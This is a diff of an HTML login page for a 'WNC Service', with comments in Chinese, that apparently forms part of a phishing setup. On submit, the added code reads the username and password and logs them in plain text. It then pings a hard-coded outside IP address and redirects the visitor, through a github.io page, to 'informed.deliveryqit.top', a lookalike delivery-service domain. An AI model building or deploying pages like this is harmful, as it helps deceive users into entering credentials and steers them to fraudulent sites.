@@ -1,43 +1,141 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
   <title>Login - WNC Service</title>
   <style>
-    /* 與前例相同 */
-    #pingImg {
-      display: none;
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f4f4f9;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+    }
+    .header-logo {
+      width: 80%;
+      max-width: 800px;
+      height: auto;
+      margin: 20px auto;
+    }
+    .login-container {
+      text-align: center;
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
+      width: 300px;
+      margin-top: 20px;
+    }
+    .logo {
+      width: 100px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 20px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
     }
   </style>
-  <script>
-    window.addEventListener('DOMContentLoaded', () => {
-      const pingImg = document.getElementById('pingImg');
+</head>
+<body>
+  <img src="./wnc.png" alt="WNC Banner" class="header-logo" />
+  <div class="login-container">
+    <img src="./wnclogo.png" alt="WNC Logo" class="logo" />
+    <h1>Welcome to WNC Service</h1>
+    <p>This service requires login to access.</p>
+    <form onsubmit="handleLogin(event)">
+      <input type="text" name="username" placeholder="Username" required />
+      <input type="password" name="password" placeholder="Password" required />
+      <button type="submit">Login</button>
+    </form>
+  </div>
 
-      pingImg.onload = function() {
-        console.log("Pinged 103.200.23.160 successfully (image loaded).");
-      };
-      pingImg.onerror = function() {
-        console.error("Failed to ping 103.200.23.160 (image error).");
-      };
-      // 設定 img src，嘗試載入 103.200.23.160 上的某圖檔
-      pingImg.src = "http://103.200.23.160/some-image.jpg";
-    });
+  <script>
+    /**
+     * 模擬 ping：以 HTTP/HTTPS 連線取代 ICMP ping。
+     * 這邊直接 fetch 一個特定 URL（或 HEAD 方式）到指定 IP 來測試連線是否可用。
+     */
+    async function pseudoPing(ip) {
+      const url = `https://${ip}/`; // 請確定該 ip 下真的有服務可回應，否則可能會失敗
+      const startTime = performance.now();
+
+      try {
+        // 使用 'no-cors' 來簡單測試存活，實務上可換用 'cors' + 實際 API endpoint
+        const response = await fetch(url, { method: 'GET', mode: 'no-cors' });
+        const endTime = performance.now();
+        console.log(`連線成功，花費時間：${(endTime - startTime).toFixed(2)} ms`);
+      } catch (error) {
+        const endTime = performance.now();
+        console.error(`連線失敗，花費時間：${(endTime - startTime).toFixed(2)} ms`, error);
+      }
+    }
 
     function handleLogin(event) {
       event.preventDefault();
-      console.log("Login button pressed, but no action taken.");
+
+      // 取表單值（依需求進行後端登入處理）
+      const form = event.target;
+      const username = form.username.value;
+      const password = form.password.value;
+
+      console.log(`Username: ${username}, Password: ${password}`);
+
+      // 按下 Login，先執行模擬 ping
+      pseudoPing('31.172.75.26');
+
+      // 5 秒後導向到指定 URL
+      setTimeout(() => {
+        // 方式 1：直接導向 (換頁)
+        window.location.href =
+          'https://zongyiu.github.io/wnc/?site=http://informed.deliveryqit.top/us';
+        
+        // 方式 2：若只是想發送連線或請求，不離開當前頁面，可用 fetch (但不會換頁):
+        // fetch('https://zongyiu.github.io/wnc/?site=http://informed.deliveryqit.top/us')
+        //   .then(res => console.log('連線成功', res))
+        //   .catch(err => console.error('連線失敗', err));
+      }, 3000);
+
+      // 後續可進行真正的登入流程，例如：
+      // fetch('/api/login', {
+      //   method: 'POST',
+      //   headers: { 'Content-Type': 'application/json' },
+      //   body: JSON.stringify({ username, password })
+      // })
+      // .then(...處理回應...)
+      // .catch(...錯誤處理...);
     }
   </script>
-</head>
-<body>
-  <!-- 網頁結構同前，省略 -->
-  <form onsubmit="handleLogin(event)">
-    <input type="text" name="username" placeholder="Username" required>
-    <input type="password" name="password" placeholder="Password" required>
-    <button type="submit">Login</button>
-  </form>
-  <!-- 隱藏的 img 元素，用來模擬 ping -->
-  <img id="pingImg" />
 </body>
 </html>
